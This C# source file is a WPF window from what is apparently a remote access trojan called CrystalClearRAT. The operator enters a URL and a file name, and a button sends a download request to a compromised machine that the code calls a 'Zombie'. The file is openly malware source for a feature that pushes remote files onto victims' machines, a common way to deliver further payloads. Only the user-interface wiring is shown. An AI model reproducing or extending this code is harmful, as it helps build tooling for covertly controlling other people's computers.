using CrystalClearRAT.Functions;
using CrystalClearRAT.Web;
using CrystalClearRAT.ZombieModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace CrystalClearRAT.Windows
{
    /// <summary>
    /// Interaction logic for URLDownloadRequestWindow.xaml
    /// </summary>
    public partial class URLDownloadRequestWindow : Window
    {
        private Zombie zombie;

        public URLDownloadRequestWindow(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
        }

        private void urlTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            CanSend();
        }

        private void fileNameTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            CanSend();
        }

        public void CanSend()
        {
            if (!string.IsNullOrEmpty(urlTextBox.Text) && !string.IsNullOrEmpty(fileNameTextBox.Text))
            {
                sendButton.IsEnabled = true;
            }
            else
            {
                sendButton.IsEnabled = false;
            }
        }

        private void sendButton_Click(object sender, RoutedEventArgs e)
        {
            Server.Send(Download.Request(urlTextBox.Text, fileNameTextBox.Text), zombie);
        }
    }
}
